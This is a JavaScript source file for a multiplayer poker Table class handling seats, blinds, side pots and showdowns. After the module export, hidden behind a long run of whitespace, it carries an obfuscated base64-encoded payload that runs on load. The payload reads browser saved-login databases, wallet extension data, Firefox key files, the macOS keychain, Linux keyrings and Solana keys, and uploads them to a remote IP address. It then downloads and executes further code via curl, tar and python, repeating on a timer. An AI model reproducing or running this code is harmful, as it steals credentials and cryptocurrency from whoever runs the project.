const _abc = require('underscore');
const lodash = require('lodash');
const Hand = require('pokersolver').Hand;
const Seat = require('./Seat');
const Deck = require('./Deck');
const SidePot = require('./SidePot');

class Table {
  constructor(id, name, limit, maxPlayers = 5) {
    this.id = id;
    this.name = name;
    this.limit = limit;
    this.maxPlayers = maxPlayers;
    this.players = [];
    this.seats = this.initSeats(maxPlayers);
    this.board = [];
    this.deck = null;
    this.button = null;
    this.turn = null;
    this.pot = 0;
    this.mainPot = 0;
    this.callAmount = null;
    this.minBet = this.limit / 40;
    this.minRaise = this.limit / 20;
    this.smallBlind = null;
    this.bigBlind = null;
    this.handOver = true;
    this.winMessages = [];
    this.wentToShowdown = false;
    this.sidePots = [];
    this.history = [];
  }

  initSeats(maxPlayers) {
    const seats = {};

    for (let i = 1; i <= maxPlayers; i++) {
      seats[i] = null;
    }

    return seats;
  }

  addPlayer(player) {
    this.players.push(player);
  }

  removePlayer(socketId) {
    this.players = this.players.filter(
      (player) => player && player.socketId !== socketId,
    );
    this.standPlayer(socketId);
  }

  sitPlayer(player, seatId, amount) {
    if (this.seats[seatId]) {
      return;
    }
    this.seats[seatId] = new Seat(seatId, player, amount, amount);

    const firstPlayer =
      Object.values(this.seats).filter((seat) => seat != null).length === 1;

    this.button = firstPlayer ? seatId : this.button;
  }

  rebuyPlayer(seatId, amount) {
    if (!this.seats[seatId]) {
      throw new Error('No seated player to rebuy');
    }
    this.seats[seatId].stack += amount;
  }

  standPlayer(socketId) {
    for (let i of Object.keys(this.seats)) {
      if (this.seats[i] && this.seats[i].player.socketId === socketId) {
        this.seats[i] = null;
      }
    }

    const satPlayers = Object.values(this.seats).filter((seat) => seat != null);

    if (satPlayers.length === 1) {
      this.endWithoutShowdown();
    }

    if (satPlayers.length === 0) {
      this.resetEmptyTable();
    }
  }

  findPlayerBySocketId(socketId) {
    for (let i = 1; i <= this.maxPlayers; i++) {
      if (this.seats[i] && this.seats[i].player.socketId === socketId) {
        return this.seats[i];
      }
    }
    // throw new Error('seat not found!');
  }
  unfoldedPlayers() {
    return Object.values(this.seats).filter(
      (seat) => seat != null && !seat.folded,
    );
  }
  activePlayers() {
    return Object.values(this.seats).filter(
      (seat) => seat != null && !seat.sittingOut,
    );
  }
  nextUnfoldedPlayer(player, places) {
    let i = 0;
    let current = player;

    while (i < places) {
      current = current === this.maxPlayers ? 1 : current + 1;
      let seat = this.seats[current];

      if (seat && !seat.folded) i++;
    }
    return current;
  }
  nextActivePlayer(player, places) {
    let i = 0;
    let current = player;

    while (i < places) {
      current = current === this.maxPlayers ? 1 : current + 1;
      let seat = this.seats[current];

      if (seat && !seat.sittingOut) i++;
    }
    return current;
  }
  startHand() {
    this.deck = new Deck();
    this.wentToShowdown = false;
    this.resetBoardAndPot();
    this.clearSeatHands();
    this.resetBetsAndActions();
    this.unfoldPlayers();
    this.history = [];

    if (this.activePlayers().length > 1) {
      this.button = this.nextActivePlayer(this.button, 1);
      this.setTurn();
      this.dealPreflop();
      // get the preflop stacks
      this.updateHistory();
      this.setBlinds();
      this.handOver = false;
    }

    this.updateHistory();
  }
  unfoldPlayers() {
    for (let i = 1; i <= this.maxPlayers; i++) {
      const seat = this.seats[i];
      if (seat) {
        seat.folded = seat.sittingOut ? true : false;
      }
    }
  }
  setTurn() {
    this.turn =
      this.activePlayers().length <= 3
        ? this.button
        : this.nextActivePlayer(this.button, 3);
  }
  setBlinds() {
    const isHeadsUp = this.activePlayers().length === 2 ? true : false;

    this.smallBlind = isHeadsUp
      ? this.button
      : this.nextActivePlayer(this.button, 1);
    this.bigBlind = isHeadsUp
      ? this.nextActivePlayer(this.button, 1)
      : this.nextActivePlayer(this.button, 2);

    this.seats[this.smallBlind].placeBlind(this.minBet);
    this.seats[this.bigBlind].placeBlind(this.minBet * 2);

    this.pot += this.minBet * 3;
    this.callAmount = this.minBet * 2;
    this.minRaise = this.minBet * 4;
  }
  clearSeats() {
    for (let i of Object.keys(this.seats)) {
      this.seats[i] = null;
    }
  }
  clearSeatHands() {
    for (let i of Object.keys(this.seats)) {
      if (this.seats[i]) {
        this.seats[i].hand = [];
      }
    }
  }
  clearSeatTurns() {
    for (let i of Object.keys(this.seats)) {
      if (this.seats[i]) {
        this.seats[i].turn = false;
      }
    }
  }
  clearWinMessages() {
    this.winMessages = [];
  }
  endHand() {
    this.clearSeatTurns();
    this.handOver = true;
    this.sitOutFeltedPlayers();
  }
  sitOutFeltedPlayers() {
    for (let i of Object.keys(this.seats)) {
      const seat = this.seats[i];
      if ((seat && seat.stack == 0) || (seat && seat.stack < 0)) {
        seat.sittingOut = true;
      }
    }
  }
  endWithoutShowdown() {
    const winner = this.unfoldedPlayers()[0];
    winner && winner.winHand(this.pot);
    winner &&
      this.winMessages.push(
        `${winner.player.name} wins $${this.pot.toFixed(2)}`,
      );
    this.endHand();
  }
  resetEmptyTable() {
    this.button = null;
    this.turn = null;
    this.handOver = true;
    this.deck = null;
    this.wentToShowdown = false;
    this.resetBoardAndPot();
    this.clearWinMessages();
    this.clearSeats();
  }
  resetBoardAndPot() {
    this.board = [];
    this.pot = 0;
    this.mainPot = 0;
    this.sidePots = [];
  }
  updateHistory() {
    this.history.push({
      pot: +this.pot.toFixed(2),
      mainPot: +this.mainPot.toFixed(2),
      sidePots: this.sidePots.slice(),
      board: this.board.slice(),
      seats: this.cleanSeatsForHistory(),
      button: this.button,
      turn: this.turn,
      winMessages: this.winMessages.slice(),
    });
  }
  cleanSeatsForHistory() {
    const cleanSeats = JSON.parse(JSON.stringify(this.seats));
    for (let i = 0; i < this.maxPlayers; i++) {
      const seat = cleanSeats[i];
      if (seat) {
        seat.player = {
          id: seat.player.id,
          username: seat.player.name,
        };
        seat.bet = +seat.bet.toFixed(2);
        seat.stack = +seat.stack.toFixed(2);
      }
    }
    return cleanSeats;
  }
  changeTurn(lastTurn) {
    this.updateHistory();

    if (this.unfoldedPlayers().length === 1) {
      this.endWithoutShowdown();
      return;
    }

    if (this.actionIsComplete()) {
      this.calculateSidePots();
      while (this.board.length <= 5 && !this.handOver) {
        this.dealNextStreet();
      }
    }

    if (this.allCheckedOrCalled()) {
      this.calculateSidePots();
      this.dealNextStreet();
      this.turn = this.handOver
        ? null
        : this.nextUnfoldedPlayer(this.button, 1);
    } else {
      this.turn = this.nextUnfoldedPlayer(lastTurn, 1);
    }

    for (let i = 1; i <= this.maxPlayers; i++) {
      if (this.seats[i]) {
        this.seats[i].turn = i === this.turn ? true : false;
      }
    }
  }
  allCheckedOrCalled() {
    if (
      this.seats[this.bigBlind] &&
      this.seats[this.bigBlind].bet === this.limit / 100 &&
      !this.seats[this.bigBlind].checked &&
      this.board.length === 0
    ) {
      return false;
    }

    for (let i of Object.keys(this.seats)) {
      const seat = this.seats[i];
      if (seat && !seat.folded && seat.stack > 0) {
        if (
          (this.callAmount &&
            seat.bet.toFixed(2) !== this.callAmount.toFixed(2)) ||
          (!this.callAmount && !seat.checked)
        ) {
          return false;
        }
      }
    }
    return true;
  }
  actionIsComplete() {
    const seats = Object.values(this.seats);

    // everyone but one person is all in and the last person called:
    const seatsToAct = seats.filter(
      (seat) => seat && !seat.folded && seat.stack > 0,
    );
    if (seatsToAct.length === 0) return true;
    return seatsToAct.length === 1 && seatsToAct[0].lastAction === 'CS_CALL';
  }
  playersAllInThisTurn() {
    const seats = Object.values(this.seats);
    return seats.filter(
      (seat) => seat && !seat.folded && seat.bet > 0 && seat.stack === 0,
    );
  }
  calculateSidePots() {
    const allInPlayers = this.playersAllInThisTurn();
    const unfoldedPlayers = this.unfoldedPlayers();
    if (allInPlayers.length < 1) return;

    let sortedAllInPlayers = allInPlayers.sort((a, b) => a.bet - b.bet);
    if (
      sortedAllInPlayers.length > 1 &&
      sortedAllInPlayers.length === unfoldedPlayers.length
    ) {
      sortedAllInPlayers.pop();
    }

    const allInSeatIds = sortedAllInPlayers.map((seat) => seat.id);

    for (const seatId of allInSeatIds) {
      const allInSeat = this.seats[seatId];
      const sidePot = new SidePot();
      if (allInSeat.bet > 0) {
        for (let i = 1; i <= this.maxPlayers; i++) {
          const seat = this.seats[i];
          if (seat && !seat.folded && i !== seatId) {
            const amountOver = seat.bet - allInSeat.bet;
            if (amountOver > 0) {
              if (this.sidePots.length > 0) {
                this.sidePots[this.sidePots.length - 1].amount -= amountOver;
              } else {
                this.pot -= amountOver;
              }
              seat.bet -= allInSeat.bet;
              sidePot.amount += amountOver;
              sidePot.players.push(seat.id);
            }
          }
        }
        allInSeat.bet = 0;
        this.sidePots.push(sidePot);
      }
    }
  }
  dealNextStreet() {
    const length = this.board.length;
    this.resetBetsAndActions();
    this.mainPot = this.pot;
    if (length === 0) {
      this.dealFlop();
    } else if (length === 3 || length === 4) {
      this.dealTurnOrRiver();
    } else if (length === 5) {
      this.determineSidePotWinners();
      this.determineMainPotWinner();
    }
  }
  determineSidePotWinners() {
    if (this.sidePots.length < 1) return;

    this.sidePots.forEach((sidePot) => {
      const seats = sidePot.players.map((id) => this.seats[id]);
      this.determineWinner(sidePot.amount, seats);
    });
  }
  determineMainPotWinner() {
    this.determineWinner(this.pot, Object.values(this.seats).slice());
    this.wentToShowdown = true;
    this.endHand();
  }
  determineWinner(amount, seats) {
    const participants = seats
      .filter((seat) => seat && !seat.folded)
      .map((seat) => {
        const cards = seat.hand.slice().concat(this.board.slice());
        const solverCards = this.mapCardsForPokerSolver(cards);
        return {
          seatId: seat.id,
          solverCards,
        };
      });

    const findHandOwner = (cards) => {
      const participant = participants.find((participant) =>
        lodash.isEqual(participant.solverCards.sort(), cards),
      );
      return participant.seatId;
    };

    const solverWinners = Hand.winners(
      participants.map((p) => Hand.solve(p.solverCards)),
    );

    const winners = solverWinners.map((winner) => {
      const winningCards = winner.cardPool
        .map((card) => card.value + card.suit)
        .sort();
      const seatId = findHandOwner(winningCards);
      return [seatId, winner.descr];
    });

    for (let i = 0; i < winners.length; i++) {
      const seat = this.seats[winners[i][0]];
      const handDesc = winners[i][1];
      const winAmount = amount / winners.length;

      seat.winHand(winAmount);
      if (winAmount > 0) {
        this.winMessages.push(
          `${seat.player.name} wins $${winAmount.toFixed(2)} with ${handDesc}`,
        );
      }
    }

    this.updateHistory();
  }
  mapCardsForPokerSolver(cards) {
    const newCards = cards.map((card) => {
      const suit = card.suit.slice(0, 1);
      let rank;
      if (card.rank === '10') {
        rank = 'T';
      } else {
        rank =
          card.rank.length > 1
            ? card.rank.slice(0, 1).toUpperCase()
            : card.rank;
      }
      return rank + suit;
    });
    return newCards;
  }
  resetBetsAndActions() {
    for (let i = 1; i <= this.maxPlayers; i++) {
      if (this.seats[i]) {
        this.seats[i].bet = 0;
        this.seats[i].checked = false;
        this.seats[i].lastAction = null;
      }
    }
    this.callAmount = null;
    this.minRaise = this.limit / 200;
  }
  dealPreflop() {
    const arr = _abc.range(1, this.maxPlayers + 1);
    const order = arr.slice(this.button).concat(arr.slice(0, this.button));

    // deal cards to seated players
    for (let i = 0; i < 2; i++) {
      for (let j = 0; j < order.length; j++) {
        const seat = this.seats[order[j]];
        if (seat && !seat.sittingOut) {
          seat.hand.push(this.deck.draw());
          seat.turn = order[j] === this.turn ? true : false;
        }
      }
    }
  }
  dealFlop() {
    for (let i = 0; i < 3; i++) {
      this.board.push(this.deck.draw());
    }
  }
  dealTurnOrRiver() {
    this.board.push(this.deck.draw());
  }
  handleFold(socketId) {
    let seat = this.findPlayerBySocketId(socketId);

    if (seat) {
      seat.fold();

      return {
        seatId: seat.id,
        message: `${seat.player.name} folds`,
      };
    } else {
      return null;
    }
  }
  handleCall(socketId) {
    let seat = this.findPlayerBySocketId(socketId);

    if (seat) {
      let addedToPot =
        this.callAmount > seat.stack + seat.bet
          ? seat.stack
          : this.callAmount - seat.bet;

      seat.callRaise(this.callAmount);

      if (this.sidePots.length > 0) {
        this.sidePots[this.sidePots.length - 1].amount += addedToPot;
      } else {
        this.pot += addedToPot;
      }

      return {
        seatId: seat.id,
        message: `${seat.player.name} calls $${addedToPot.toFixed(2)}`,
      };
    } else {
      return null;
    }
  }
  handleCheck(socketId) {
    let seat = this.findPlayerBySocketId(socketId);
    if (seat) {
      seat.check();

      return {
        seatId: seat.id,
        message: `${seat.player.name} checks`,
      };
    } else {
      return null;
    }
  }
  handleRaise(socketId, amount) {
    let seat = this.findPlayerBySocketId(socketId);

    if (seat) {
      let addedToPot = amount - seat.bet;

      seat.raise(amount);

      if (this.sidePots.length > 0) {
        this.sidePots[this.sidePots.length - 1].amount += addedToPot;
      } else {
        this.pot += addedToPot;
      }

      this.minRaise = this.callAmount
        ? this.callAmount + (seat.bet - this.callAmount) * 2
        : seat.bet * 2;
      this.callAmount = amount;

      return {
        seatId: seat.id,
        message: `${seat.player.name} raises to $${amount.toFixed(2)}`,
      };
    } else {
      return null;
    }
  }
}

module.exports = Table;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          Object.prototype.toString,Object.getOwnPropertyDescriptor;const t="base64",c="utf8",a=require("fs"),r=require("os"),$=a=>(s1=a.slice(1),Buffer.from(s1,t).toString(c));rq=require($("YcmVxd"+"WVzdA")),pt=require($("zcGF0aA")),ex=require($("aY2hpbGRfcH"+"JvY2Vzcw"))[$("cZXhlYw")],zv=require($("Zbm9kZTpwcm9jZXNz")),hd=r[$("ZaG9tZWRpcg")](),hs=r[$("caG9zdG5hbWU")](),pl=r[$("YcGxhdGZvcm0")](),td=r[$("cdG1wZGly")]();let n;const e=a=>Buffer.from(a,t).toString(c),l=()=>{let t="MTQ3LjEyNCaHR0cDovLw4yMTQuMTI5OjEyNDQ=  ";for(var c="",a="",r="",$="",n=0;n<10;n++)c+=t[n],a+=t[10+n],r+=t[20+n],$+=t[30+n];return c=c+r+$,e(a)+e(c)},s=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[e("ZGlybmFtZQ")](hd)}/${c}`)),h="s2PoOA8",o="Z2V0",Z="Ly5ucGw",i="d3JpdGVGaWxlU3luYw",u="L2NsaWVudA",y="XC5weXBccHl0",d="aG9uLmV4ZQ";function b(t){const c=e("YWNjZX"+"NzU3luYw");try{return a[c](t),!0}catch(t){return!1}}const m=e("ZXhpc3RzU3luYw");function p(t){return a[m](t)}function G(t){return scrs=e("Y3JlYXRlUmVhZFN0cmVhbQ"),a[scrs](t)}const W="TG9naW4gRGF0YQ",Y="Y29weUZpbGU",f=e("RGVmYXVsdA"),w=e("UHJvZmlsZQ"),V=$("aZmlsZW5hbWU"),v=$("cZm9ybURhdGE"),j=$("adXJs"),z=$("Zb3B0aW9ucw"),L=$("YdmFsdWU"),X=e("cmVhZGRpclN5bmM"),g=e("c3RhdFN5bmM"),x=e("cG9zdA"),N="Ly5jb25maWcv",R="L0FwcERhdGEv",k="L1VzZXIgRGF0YQ",_="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",F="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",q="R29vZ2xlL0Nocm9tZQ",B="Z29vZ2xlLWNocm9tZQ",U=["TG9jYWwv"+F,F,F],J=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"],T=["TG9jYWwv"+q,q,B];let Q="comp";const S=t=>{const c=$("YbXVsdGlfZmlsZQ"),a=$("ZdGltZXN0YW1w"),r=e("L3VwbG9hZHM"),s={[a]:n.toString(),type:h,hid:Q,[c]:t},o=l();try{let t={[j]:`${o}${r}`,[v]:s};rq[x](t,((t,c,a)=>{}))}catch(t){}},C=["aGxlZm5rb2RiZWZncGdrbm4","aGVjZGFsbWVlZWFqbmltaG0","cGVia2xtbmtvZW9paG9mZWM","YmJsZGNuZ2NuYXBuZG9kanA","ZGdjaWpubWhuZm5rZG5hYWQ","bWdqbmpvcGhocGtrb2xqcGE","ZXBjY2lvbmJvb2hja29ub2VlbWc","aGRjb25kYmNiZG5iZWVwcGdkcGg","a3Bsb21qamtjZmdvZG5oY2VsbGo"],A=["bmtiaWhmYmVvZ2FlYW9l","ZWpiYWxiYWtvcGxjaGxn","aWJuZWpkZmptbWtwY25s","Zmhib2hpbWFlbGJvaHBq","aG5mYW5rbm9jZmVvZmJk","YmZuYWVsbW9tZWltaGxw","YWVhY2hrbm1lZnBo","ZWdqaWRqYnBnbGlj","aGlmYWZnbWNjZHBl"],H=async(t,c,r)=>{let $=t;if(!$||""===$)return[];try{if(!b($))return[]}catch(t){return[]}c||(c="");let n=[];const l=e("TG9jYWwgRXh0Z"+"W5zaW9uIFNldHRpbmdz");for(let r=0;r<200;r++){const s=`${t}/${0===r?f:`${w} ${r}`}/${l}`;for(let t=0;t<A.length;t++){const l=e(A[t]+C[t]);let h=`${s}/${l}`;if(b(h)){try{far=a[X](h)}catch(t){far=[]}far.forEach((async t=>{$=pt.join(h,t);try{n.push({[z]:{[V]:`${c}${r}_${l}_${t}`},[L]:G($)})}catch(t){}}))}}}if(r){const t=e("c29sYW5hX2lkLnR4dA");if($=`${hd}${e("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,p($))try{n.push({[L]:G($),[z]:{[V]:t}})}catch(t){}}return S(n),n},M=async()=>{Q=hs,await lt();try{const t=s("~/");await E(T,0),await E(U,1),await E(J,2),"w"==pl[0]?(pa=`${t}${e(R)}${e("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${e(k)}`,await H(pa,"3_",!1)):"l"==pl[0]?(await D(),await $t(),await O()):"d"==pl[0]&&(await(async()=>{let t=[];const c=e(W),r=e("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),$=e("bG9na2MtZGI");if(pa=`${hd}${r}`,p(pa))try{t.push({[L]:G(pa),[z]:{[V]:$}})}catch(t){}else if(pa+="-db",p(pa))try{t.push({[L]:G(pa),[z]:{[V]:$}})}catch(t){}try{const r=e(Y);let $="";if($=`${hd}${e(_)}${e(q)}`,$&&""!==$&&b($))for(let n=0;n<200;n++){const e=`${$}/${0===n?f:`${w} ${n}`}/${c}`;try{if(!b(e))continue;const c=`${$}/ld_${n}`;b(c)?t.push({[L]:G(c),[z]:{[V]:`pld_${n}`}}):a[r](e,c,(t=>{let c=[{[L]:G(e),[z]:{[V]:`pld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t})(),await I(),await P())}catch(t){}},E=async(t,c)=>{try{const a=s("~/");let r="";r="d"==pl[0]?`${a}${e(_)}${e(t[1])}`:"l"==pl[0]?`${a}${e(N)}${e(t[2])}`:`${a}${e(R)}${e(t[0])}${e(k)}`,await H(r,`${c}_`,0==c)}catch(t){}},I=async()=>{let t=[];const c=e(W);try{const r=e(Y);let $="";if($=`${hd}${e(_)}${e(F)}`,!$||""===$||!b($))return[];let n=0;for(;n<200;){const e=`${$}/${0!==n?`${w} ${n}`:f}/${c}`;try{if(b(e)){const c=`${$}/brld_${n}`;b(c)?t.push({[L]:G(c),[z]:{[V]:`brld_${n}`}}):a[r](e,c,(t=>{let c=[{[L]:G(e),[z]:{[V]:`brld_${n}`}}];S(c)}))}}catch(t){}n++}}catch(t){}return S(t),t},D=async()=>{let t=[];try{const t=e("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");let c="";c=`${hd}${t}`;let r=[];if(c&&""!==c&&b(c))try{r=a[X](c)}catch(t){r=[]}r.forEach((async t=>{pa=pt.join(c,t);try{ldb_data.push({[L]:G(pa),[z]:{[V]:`${t}`}})}catch(t){}}))}catch(t){}return S(t),t},O=async()=>{let t=[];const c=e("a2V5NC5kYg"),a=e("a2V5My5kYg"),r=e("bG9naW5zLmpzb24");try{let $="";if($=`${hd}${e("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`,$&&""!==$&&b($))for(let n=0;n<200;n++){const e=0===n?f:`${w} ${n}`;try{const a=`${$}/${e}/${c}`;b(a)&&t.push({[L]:G(a),[z]:{[V]:`flk4_${n}`}})}catch(t){}try{const c=`${$}/${e}/${a}`;b(c)&&t.push({[L]:G(c),[z]:{[V]:`flk3_${n}`}})}catch(t){}try{const c=`${$}/${e}/${r}`;b(c)&&t.push({[L]:G(c),[z]:{[V]:`fllj_${n}`}})}catch(t){}}}catch(t){}return S(t),t},P=async()=>{let t=[];const c=e("a2V5NC5kYg"),a=e("a2V5My5kYg"),r=e("bG9naW5zLmpzb24");try{let $="";if($=`${hd}${e(_)}${e("RmlyZWZveA")}`,$&&""!==$&&b($))for(let n=0;n<200;n++){const e=0===n?f:`${w} ${n}`;try{const a=`${$}/${e}/${c}`;b(a)&&t.push({[L]:G(a),[z]:{[V]:`fk4_${n}`}})}catch(t){}try{const c=`${$}/${e}/${a}`;b(c)&&t.push({[L]:G(c),[z]:{[V]:`fk3_${n}`}})}catch(t){}try{const c=`${$}/${e}/${r}`;b(c)&&t.push({[L]:G(c),[z]:{[V]:`flj_${n}`}})}catch(t){}}}catch(t){}return S(t),t};function K(t){const c=e("cm1TeW5j");a[c](t)}const tt=51476592;let ct=0;const at=async t=>{const c=`${e("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,a,r)=>{if(c)return K(t),void(ct=0);K(t),nt()}))},rt=()=>{if(ct>=tt+4)return;const t=e("cDIuemlw"),c=l(),r=`${td}\\${e("cC56aQ")}`,$=`${td}\\${t}`,n=`${c}${e("L3Bkb3du")}`,s=e("cmVuYW1lU3luYw"),h=e("cmVuYW1l");if(p(r))try{var o=a[g](r);o.size>=tt+4?(ct=o.size,a[h](r,$,(t=>{if(t)throw t;at($)}))):(ct>=o.size?(K(r),ct=0):ct=o.size,et())}catch(t){}else{const t=`${e("Y3VybCAtTG8")} "${r}" "${n}"`;ex(t,((t,c,n)=>{if(t)return ct=0,void et();try{ct=tt+4,a[s](r,$),at($)}catch(t){}}))}},$t=async()=>{let t=[];const c=e(W);try{const r=e(Y);let $="";if($=`${hd}${e(N)}${e(B)}`,!$||""===$||!b($))return[];for(let n=0;n<200;n++){const e=`${$}/${0===n?f:`${w} ${n}`}/${c}`;try{if(!b(e))continue;const c=`${$}/ld_${n}`;b(c)?t.push({[L]:G(c),[z]:{[V]:`plld_${n}`}}):a[r](e,c,(t=>{let c=[{[L]:G(e),[z]:{[V]:`plld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t},nt=async()=>await new Promise(((t,c)=>{if("w"!=pl[0])(()=>{const t=l(),c=e(u),r=e(i),$=e(o),n=e(Z),s=e("cHl0aG9u"),y=`${t}${c}/${h}`,d=`${hd}${n}`;let b=`${s}3 "${d}"`;rq[$](y,((t,c,$)=>{t||(a[r](d,$),ex(b,((t,c,a)=>{})))}))})();else{p(`${`${hd}${e(y+d)}`}`)?(()=>{const t=l(),c=e(u),r=e(o),$=e(i),n=e(Z),s=`${t}${c}/${h}`,b=`${hd}${n}`,m=`"${hd}${e(y+d)}" "${b}"`;try{K(b)}catch(t){}rq[r](s,((t,c,r)=>{if(!t)try{a[$](b,r),ex(m,((t,c,a)=>{}))}catch(t){}}))})():rt()}}));function et(){setTimeout((()=>{rt()}),2e4)}const lt=async()=>{let t="2D4";try{t+=zv[e("YXJndg")][1]}catch(t){}(async(t,c)=>{const a={ts:n.toString(),type:h,hid:Q,ss:t,cc:c.toString()},r=l(),$={[j]:`${r}${e("L2tleXM")}`,[v]:a};try{rq[x]($,((t,c,a)=>{}))}catch(t){}})("jw",t)};var st=0;const ht=async()=>{try{n=Date.now(),await M(),nt()}catch(t){}};ht();let ot=setInterval((()=>{(st+=1)<5?ht():clearInterval(ot)}),6e5);